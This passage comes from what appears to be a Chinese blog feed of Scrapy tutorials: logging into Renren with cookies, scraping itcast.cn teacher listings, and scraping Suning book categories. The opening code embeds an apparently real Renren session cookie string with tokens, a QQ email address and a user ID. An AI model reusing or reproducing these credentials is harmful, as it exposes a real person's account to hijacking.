taihe_bi_sdk_session=97aeb76cc7bd9c0c4fe9d7c6dcfb5eed; p=bde487db3148887ef533de31e99862b30; first_login_flag=1; ln_uact=3321647547@qq.com; ln_hurl=http://hdn.xnimg.cn/photos/hdn221/20200118/2045/h_main_TCCN_9c6c00011d14195a.jpg; t=de1623c5b5c112750032f096cc552d6d0; societyguester=de1623c5b5c112750032f096cc552d6d0; id=973482150; xnsid=97c70d4d; ver=7.0; loginfrom=null; wp_fold=0; jebe_key=538aac78-0044-476f-980c-0e53071b02d6%7C42d7b478811716336baa94c4523e9833%7C1582296534360%7C1%7C1582296533331&quot;</span></span><br><span class="line">        cookies = &#123;i.split(<span class="string">&quot;=&quot;</span>)[<span class="number">0</span>]:i.split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> cookies.split(<span class="string">&quot;; &quot;</span>)&#125; <span class="comment">#将cookies转化为字典形式</span></span><br><span class="line">        <span class="keyword">yield</span> scrapy.Request( <span class="comment">#使用scrapy.Request发起请求</span></span><br><span class="line">            self.start_urls[<span class="number">0</span>], <span class="comment">#这里的start_urls是个列表，该参数是字符串类型，要设置为列表的第0个元素</span></span><br><span class="line">            callback=self.parse,</span><br><span class="line">            cookies=cookies <span class="comment">#在请求中带上cookies</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(re.findall(<span class="string">&quot;要么绽放要么死去&quot;</span>,response.body.decode())) <span class="comment">#这里使用正则查找响应页面是否包含用户名，以此确认爬虫是否访问到个人主页</span></span><br><span class="line">        <span class="keyword">yield</span> scrapy.Request(</span><br><span class="line">            <span class="string">&quot;http://www.renren.com/973482150/profile?v=info_timeline&quot;</span>, <span class="comment">#个人资料页</span></span><br><span class="line">            callback=self.parse_detail, <span class="comment">#这里就不需要设置cookies，因为上一条请求设置过了，爬虫发起的请求都将带上cookies</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_detail</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(re.findall(<span class="string">&quot;要么绽放要么死去&quot;</span>,response.body.decode())) <span class="comment">#使用正则确认个人资料页是否成功抓取</span></span><br></pre></td></tr></table></figure>
<p>settings.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Scrapy settings for cookielogin project</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For simplicity, this file contains only settings considered important or</span></span><br><span class="line"><span class="comment"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/settings.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"></span><br><span class="line">BOT_NAME = <span class="string">&#x27;cookielogin&#x27;</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;cookielogin.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;cookielogin.spiders&#x27;</span></span><br><span class="line"></span><br><span class="line">COOKIES_DEBUG = <span class="literal">True</span> <span class="comment">#我们开启这个cookies_debug的功能，可以在输出界面看到cookies的传输情况</span></span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line"><span class="comment">#USER_AGENT = &#x27;cookielogin (+http://www.yourdomain.com)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS = 32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class="line"><span class="comment"># See also autothrottle settings and docs</span></span><br><span class="line"><span class="comment">#DOWNLOAD_DELAY = 3</span></span><br><span class="line"><span class="comment"># The download delay setting will honor only one of:</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable cookies (enabled by default)</span></span><br><span class="line"><span class="comment">#COOKIES_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable Telnet Console (enabled by default)</span></span><br><span class="line"><span class="comment">#TELNETCONSOLE_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Override the default request headers:</span></span><br><span class="line"><span class="comment">#DEFAULT_REQUEST_HEADERS = &#123;</span></span><br><span class="line"><span class="comment">#   &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;Accept-Language&#x27;: &#x27;en&#x27;,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable spider middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"><span class="comment">#SPIDER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;cookielogin.middlewares.CookieloginSpiderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable downloader middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;cookielogin.middlewares.CookieloginDownloaderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable extensions</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class="line"><span class="comment">#EXTENSIONS = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure item pipelines</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"><span class="comment">#ITEM_PIPELINES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;cookielogin.pipelines.CookieloginPipeline&#x27;: 300,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_ENABLED = True</span></span><br><span class="line"><span class="comment"># The initial download delay</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class="line"><span class="comment"># The maximum download delay to be set in case of high latencies</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class="line"><span class="comment"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class="line"><span class="comment"># each remote server</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class="line"><span class="comment"># Enable showing throttling stats for every response received:</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_DEBUG = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class="line"><span class="comment">#HTTPCACHE_ENABLED = True</span></span><br><span class="line"><span class="comment">#HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class="line"><span class="comment">#HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class="line"><span class="comment">#HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class="line"><span class="comment">#HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们用到了scrapy内置的函数，发起带cookies的请求，以访问登录后的页面。这个cookies一旦设置，爬虫发起的所有请求都将带上cookies。我们通过在settings.py开启<code>COOKIES_DEBUG</code>功能，追踪cookies的传送过程。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc4fi4fjhtj31f60u0n6x.jpg" alt="image.png"><br>将cookies转化为字典形式的方法：<code>cookies = &#123;i.split(&quot;=&quot;)[0]:i.split(&quot;=&quot;)[1] for i in cookies.split(&quot;; &quot;)&#125;</code>这个方法很常用，要熟记。<br>正则表达式<code>re.findall(&quot;要么绽放要么死去&quot;,response.body.decode())</code>是在查找响应页面中是否含有<code>要么绽放要么死去</code>这个字符串，最终会返回所有的<code>要么绽放要么死去</code>字符串。<br><code>response.body.decode()</code>这个属性是表示响应页面的html字符串。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
        <category>scrapy框架爬虫</category>
      </categories>
      <tags>
        <tag>scrapy爬虫实例</tag>
        <tag>携带cookie登录人人网</tag>
      </tags>
  </entry>
  <entry>
    <title>scrapy爬虫实例之爬取师资信息</title>
    <url>//posts/ZH-CN/Scrapy_Spider_Teachers.html</url>
    <content><![CDATA[<h2 id="scrapy是什么"><a href="#scrapy是什么" class="headerlink" title="scrapy是什么"></a>scrapy是什么</h2><p>Scrapy是一个为了爬取网站数据，提取结构性数据而编写的应用框架，我们只需要实现少量的代码，就能够快速的抓取。使用了Twisted异步网络框架，可以加快我们的下载速度。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbzfm0t9qyj30mz0dltbh.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbzfmo58goj30k40cyjw5.jpg" alt="image.png"><br>scrapy engine充当交通枢纽的核心作用，调度各个模块之间的联结，最终是达到分布式爬虫的目的。<br>需要我们更改的代码，就是爬虫模块和pipeline模块。爬虫模块负责爬取并提取数据，pipeline模块负责保存数据结果。在使用pipeline模块之前，需要在settings模块开启pipeline功能。<br>pipeline翻译成中文是「管线」的意思。起到数据传输的作用。</p>
<h2 id="scrapy基本用法"><a href="#scrapy基本用法" class="headerlink" title="scrapy基本用法"></a>scrapy基本用法</h2><p>scrapy是个爬虫框架，框架的意思就是模板，它会预定义一些设置，我们只需要加上自定义的内容就可以实现个性化的爬虫需求。<br>scrapy爬虫的步骤：</p>
<ol>
<li>创建爬虫项目<ul>
<li><code>scrapy startproject 项目名</code></li>
</ul>
</li>
<li>创建爬虫<ul>
<li><code>scrapy genspider 爬虫名 allowdomain</code></li>
<li>allowdomain设置的是允许爬取的域名范围</li>
</ul>
</li>
<li>写爬虫<ul>
<li>修改爬虫文件，爬取并提取数据</li>
<li>修改settings文件，开启pipeline功能</li>
<li>修改pipeline文件，保存数据</li>
</ul>
</li>
<li>运行爬虫<ul>
<li><code>scrapy crawl 爬虫名</code></li>
</ul>
</li>
</ol>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>抓取itcast.cn网站的师资信息。<br>itcast.py:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ItcastSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;itcast&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;itcast.cn&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://www.itcast.cn/channel/teacher.shtml&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="comment">#使用xpath处理start_url对应的响应</span></span><br><span class="line">        <span class="comment"># result = response.xpath(&quot;//div[@class=&#x27;tea_con&#x27;]//h3/text()&quot;).extract()</span></span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#分组</span></span><br><span class="line">        li_list = response.xpath(<span class="string">&quot;//div[@class=&#x27;tea_con&#x27;]//li&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> li <span class="keyword">in</span> li_list:</span><br><span class="line">            item = &#123;&#125;</span><br><span class="line">            <span class="comment"># item[&quot;name&quot;] = li.xpath(&quot;.//div[@class=&#x27;li_txt&#x27;]/h3/text()&quot;)</span></span><br><span class="line">            <span class="comment"># item[&quot;name&quot;] = li.xpath(&quot;.//div[@class=&#x27;li_txt&#x27;]/h3/text()&quot;).extract()[0]</span></span><br><span class="line">            item[<span class="string">&quot;name&quot;</span>] = li.xpath(<span class="string">&quot;.//div[@class=&#x27;li_txt&#x27;]/h3/text()&quot;</span>).extract_first()</span><br><span class="line">            item[<span class="string">&quot;title&quot;</span>] = li.xpath(<span class="string">&quot;.//h4/text()&quot;</span>).extract_first()</span><br><span class="line">            item[<span class="string">&quot;introduction&quot;</span>] = li.xpath(<span class="string">&quot;.//div[@class=&#x27;li_txt&#x27;]/p/text()&quot;</span>).extract_first()</span><br><span class="line">            <span class="comment"># print(item)</span></span><br><span class="line">            <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure>
<p>pipelines.py:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define your item pipelines here</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class="line"><span class="comment"># See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyspiderPipeline</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        item[<span class="string">&quot;hello&quot;</span>] = <span class="string">&quot;world&quot;</span></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyspiderPipeline2</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>
<p>settings.py:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Scrapy settings for myspider project</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For simplicity, this file contains only settings considered important or</span></span><br><span class="line"><span class="comment"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/settings.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"></span><br><span class="line">BOT_NAME = <span class="string">&#x27;myspider&#x27;</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;myspider.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;myspider.spiders&#x27;</span></span><br><span class="line"></span><br><span class="line">LOG_LEVEL = <span class="string">&#x27;WARNING&#x27;</span></span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line"><span class="comment">#USER_AGENT = &#x27;myspider (+http://www.yourdomain.com)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS = 32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class="line"><span class="comment"># See also autothrottle settings and docs</span></span><br><span class="line"><span class="comment">#DOWNLOAD_DELAY = 3</span></span><br><span class="line"><span class="comment"># The download delay setting will honor only one of:</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable cookies (enabled by default)</span></span><br><span class="line"><span class="comment">#COOKIES_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable Telnet Console (enabled by default)</span></span><br><span class="line"><span class="comment">#TELNETCONSOLE_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Override the default request headers:</span></span><br><span class="line"><span class="comment">#DEFAULT_REQUEST_HEADERS = &#123;</span></span><br><span class="line"><span class="comment">#   &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;Accept-Language&#x27;: &#x27;en&#x27;,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable spider middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"><span class="comment">#SPIDER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;myspider.middlewares.MyspiderSpiderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable downloader middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;myspider.middlewares.MyspiderDownloaderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable extensions</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class="line"><span class="comment">#EXTENSIONS = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure item pipelines</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">&#x27;myspider.pipelines.MyspiderPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">    <span class="string">&#x27;myspider.pipelines.MyspiderPipeline2&#x27;</span>: <span class="number">301</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_ENABLED = True</span></span><br><span class="line"><span class="comment"># The initial download delay</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class="line"><span class="comment"># The maximum download delay to be set in case of high latencies</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class="line"><span class="comment"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class="line"><span class="comment"># each remote server</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class="line"><span class="comment"># Enable showing throttling stats for every response received:</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_DEBUG = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class="line"><span class="comment">#HTTPCACHE_ENABLED = True</span></span><br><span class="line"><span class="comment">#HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class="line"><span class="comment">#HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class="line"><span class="comment">#HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class="line"><span class="comment">#HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>xpath用法：<code>item[&quot;name&quot;] = li.xpath(&quot;.//div[@class=&#39;li_txt&#39;]/h3/text()&quot;).extract_first()</code><br>这里的<code>extract_first()</code>是用来提取我们所需要的数据。等价于<code>item[&quot;name&quot;] = li.xpath(&quot;.//div[@class=&#39;li_txt&#39;]/h3/text()&quot;).extract()[0]</code><br><code>item[&quot;name&quot;] = li.xpath(&quot;.//div[@class=&#39;li_txt&#39;]/h3/text()&quot;)</code>这样的用法，返回的结果是selector对象。</p>
<p><code>.extract()[0]</code>和<code>.extract_first()</code>的区别：<br><code>.extract()[0]</code>：如果没有结果，则程序报错。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbzg5z6tsgj30ui0hcq6u.jpg" alt="image.png"><br><code>.extract_first()</code>：如果没有结果，则返回None。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbzg6uwrsyj30ui0hcq8s.jpg" alt="image.png"></p>
<p>pipeline设置的权重值，指的是距离中心引擎的管道长度，距离引擎越近的pipeline，越先执行。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
        <category>scrapy框架爬虫</category>
      </categories>
      <tags>
        <tag>scrapy爬虫实例</tag>
        <tag>爬取师资信息</tag>
      </tags>
  </entry>
  <entry>
    <title>scrapy爬虫实例之爬取苏宁图书的图书信息</title>
    <url>//posts/ZH-CN/Scrapy_Spider_Sunning_Book.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>把<a href="https://book.suning.com/">苏宁图书</a>的子分类图书信息全部爬取下来。爬取的数据字段包括大分类名称、子分类名称、子分类下的图书信息。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0g90wjofj31f60u0wsl.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>思路：</p>
<ol>
<li>分组</li>
<li>获取大分类名称、小分类的名称、小分类的url</li>
<li>发送小分类url的请求，提取小分类的数据</li>
<li>提取当前页的数据</li>
</ol>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>snbook.py：关键点在于，提取大分类名称、小分类名称，要嵌套for循环实现。实验了好久才搞出来😱😱😱😱</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> book.items <span class="keyword">import</span> BookItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SnbookSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;snbook&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;suning.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;https://book.suning.com/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="comment">#1. 分组</span></span><br><span class="line">        menu_list = response.xpath(<span class="string">&quot;//div[@class=&#x27;left-menu-container&#x27;]//div[@class=&#x27;menu-item&#x27;]&quot;</span>)</span><br><span class="line">        item = BookItem()</span><br><span class="line">        <span class="comment">#2. 获取大分类名称、小分类的名称、小分类的url</span></span><br><span class="line">        <span class="keyword">for</span> menu <span class="keyword">in</span> menu_list:</span><br><span class="line">            sub_list = menu.xpath(<span class="string">&quot;.//dd/a&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> sub <span class="keyword">in</span> sub_list:</span><br><span class="line">                item[<span class="string">&quot;category&quot;</span>] = menu.xpath(<span class="string">&quot;.//h3/a/text()&quot;</span>).extract_first()</span><br><span class="line">                item[<span class="string">&quot;sub_category&quot;</span>] = sub.xpath(<span class="string">&quot;./text()&quot;</span>).extract_first()</span><br><span class="line">                item[<span class="string">&quot;sub_category_url&quot;</span>] = sub.xpath(<span class="string">&quot;./@href&quot;</span>).extract_first()</span><br><span class="line">                <span class="comment"># 3. 发送小分类url的请求，提取小分类的数据</span></span><br><span class="line">                <span class="keyword">yield</span> scrapy.Request(</span><br><span class="line">                    item[<span class="string">&quot;sub_category_url&quot;</span>],</span><br><span class="line">                    callback=self.parse_detail,</span><br><span class="line">                    meta=&#123;<span class="string">&quot;item&quot;</span>:item&#125;</span><br><span class="line">                )</span><br><span class="line">                <span class="comment"># print(item)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_detail</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = response.meta[<span class="string">&quot;item&quot;</span>]</span><br><span class="line">        <span class="comment"># 4. 提取当前页的数据</span></span><br><span class="line">        item[<span class="string">&quot;content_title&quot;</span>] = response.xpath(<span class="string">&quot;//img[@class=&#x27;search-loading&#x27;]/@alt&quot;</span>).extract()</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure>
<p>items.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define here the models for your scraped items</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># https://docs.scrapy.org/en/latest/topics/items.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    category = scrapy.Field()</span><br><span class="line">    sub_category = scrapy.Field()</span><br><span class="line">    sub_category_url = scrapy.Field()</span><br><span class="line">    content_title = scrapy.Field()</span><br></pre></td></tr></table></figure>
<p>settings.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Scrapy settings for book project</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For simplicity, this file contains only settings considered important or</span></span><br><span class="line"><span class="comment"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/settings.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"></span><br><span class="line">BOT_NAME = <span class="string">&#x27;book&#x27;</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;book.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;book.spiders&#x27;</span></span><br><span class="line"></span><br><span class="line">LOG_LEVEL = <span class="string">&#x27;WARNING&#x27;</span></span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure maximum 